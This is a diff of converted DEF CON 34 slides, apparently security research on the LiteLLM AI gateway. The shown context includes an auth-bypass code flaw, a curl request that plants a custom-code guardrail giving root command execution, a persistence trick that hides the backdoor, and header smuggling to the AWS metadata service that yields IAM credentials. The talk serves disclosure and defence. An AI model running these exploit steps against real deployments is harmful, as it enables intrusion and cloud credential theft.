@@ -4,23 +4,28 @@ speakers: ["Yaara Shriki"]
 conference: "DEF CON"
 conference_full: "DEF CON 34"
 edition: "34"
-year: null
+year: 2026
 source_pdf: "DEF CON 34/DEF CON 34 - Yaara Shriki - OffGuard Breaking the Most Popular AI Gateway from Auth Bypass to Cloud Compromise.pdf"
 pages: 49
 sha256: "b971088b1dc85501f78fb1eeb3b240702c7260afd19fca0c2351a3c8a07e4c89"
-text_chars: 18116
+text_chars: 18138
 ocr_pages: 0
 has_ocr: false
 redacted_secrets: 0
+ocr_confidence: null
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2"
-converted_at: "2026-08-12T00:29:17Z"
+converted_at: "2026-08-12T06:45:36Z"
 ---
 # OffGuard Breaking the Most Popular AI Gateway from Auth Bypass to Cloud Compromise
 
 **Speakers:** Yaara Shriki  
 **Conference:** DEF CON 34  
 **Source:** `DEF CON 34/DEF CON 34 - Yaara Shriki - OffGuard Breaking the Most Popular AI Gateway from Auth Bypass to Cloud Compromise.pdf` (49 pages)
+
 
 ## Slide 1
 
@@ -189,11 +194,11 @@ Quickstart guides. Docker Compose files. Tutorials. Blog posts. They all ship wi
 
 **The "example" key works on a disturbing number of production deployments.** Real keys. Real traffic. Real bills.
 
-```
+\```
 environment:
 LITELLM_MASTER_KEY:"sk-1234"
 LITELLM_SALT_KEY:"sk-1234"
-```
+\```
 
 People copy-paste to prod and never change it.
 
@@ -263,7 +268,7 @@ OffGuard · DEF CON 34 · @Wiz
 
 ##### **The flaw: failure becomes success**
 
-```
+\```
 # user_api_key_auth_mcp.py  — the OAuth2 passthrough branch
 elif oauth2_headers:
 try:
@@ -274,7 +279,7 @@ if e.status_code in (401, 403):
            validated = UserAPIKeyAuth()   # ← BYPASS: empty but "authenticated"
 else:
 raise
-```
+\```
 
 Key validation **fails** → handler catches the 401 → returns an empty `UserAPIKeyAuth()` **instead of rejecting** .
 
@@ -300,10 +305,10 @@ OffGuard · DEF CON 34 · @Wiz
 
 Once you hold a session:
 
-```
+\```
 POST /mcp/    Authorization: Bearer a    Mcp-Session-Id: <id>
 {"jsonrpc":"2.0","method":"tools/list","id":2}
-```
+\```
 
 **Enumerate** every connected MCP tool **Execute** any tool with arbitrary arguments Reach whatever they wired up: DBs, GitHub, Slack, file systems, internal APIs
 
@@ -357,10 +362,10 @@ forbidden-pattern check **`builtins`** stripped
 
 no pattern check full **`builtins`**
 
-```
+\```
 # production path — guardrail_hooks/custom_code/custom_code_guardrail.py
 exec(compile(code, "<string>", "exec"))     # no sandbox. at all.
-```
+\```
 
 **And the default Docker image runs as root.**
 
@@ -372,19 +377,19 @@ OffGuard · DEF CON 34 · @Wiz
 
 ##### **Single POST →** **`uid=0(root)`**
 
-```
+\```
 curl -X POST http://target:4000/guardrails \
  -H "Authorization: Bearer sk-1234" -d '{ "guardrail": {
     "guardrail_name":"rce","litellm_params":{
       "guardrail":"custom_code","mode":"pre_call","default_on":true,
       "custom_code":"import os\n_o=os.popen('"'"'id'"'"').read()\n..." }}}'
-```
+\```
 
 Trigger any chat completion →
 
-```
+\```
 RCE_OUTPUT: uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon)...
-```
+\```
 
 When `LITELLM_MASTER_KEY` is unset, every user is auto-granted `PROXY_ADMIN` → **unauthenticated** RCE.
 
@@ -447,10 +452,10 @@ creds via the
 backdoor empty request
 API
 
-```
+\```
 GET /guardrails/list  →  {"guardrails": []}      # the UI agrees: nothing here
 ... meanwhile the deleted code intercepts every request, including pass-through
-```
+\```
 
 **Plant → delete → persist.** The deletion **is** the stealth step.
 
@@ -550,12 +555,12 @@ OffGuard · DEF CON 34 · @Wiz
 
 LiteLLM's pass-through **strips a configured prefix** before forwarding headers. So we smuggle the metadata header **behind** the prefix:
 
-```
+\```
 PUT/imds-tokenHTTP/1.1
 x-pass-X-aws-ec2-metadata-token-ttl-seconds: 21600
        └────────── LiteLLM strips "x-pass-" ──────────┘
   forwarded to169.254.169.254  →  X-aws-ec2-metadata-token-ttl-seconds: 21600
-```
+\```
 
 The attacker now controls an **arbitrary forwarded header** → can complete the IMDSv2 handshake. **IMDSv2 defeated through application-layer header manipulation.**
 
@@ -567,27 +572,27 @@ OffGuard · DEF CON 34 · @Wiz
 
 ##### **Full chain → real IAM credentials**
 
-```
+\```
 PUT  /imds-token
-```
+\```
 
-```
+\```
  x-pass-X-aws-ec2-metadata-token-ttl-seconds: 21600
 → AQAAAC...  (v2 token, 56 chars)
 GET  /imds/meta-data/iam/security-
       credentials/litellm_default_creds-Role
  x-pass-X-aws-ec2-metadata-token: <token>
 → AccessKeyId / SecretAccessKey / Token
-```
+\```
 
-```
+\```
 $ aws sts get-caller-identity
 {
 "Account": "831926616802",
 "Arn": "arn:aws:sts::8319...:assumed-role/
   litellm_default_creds-Role/i-0b731..."
 }
-```
+\```
 
 **Valid, live AWS credentials.** Verified against a real test instance.
 
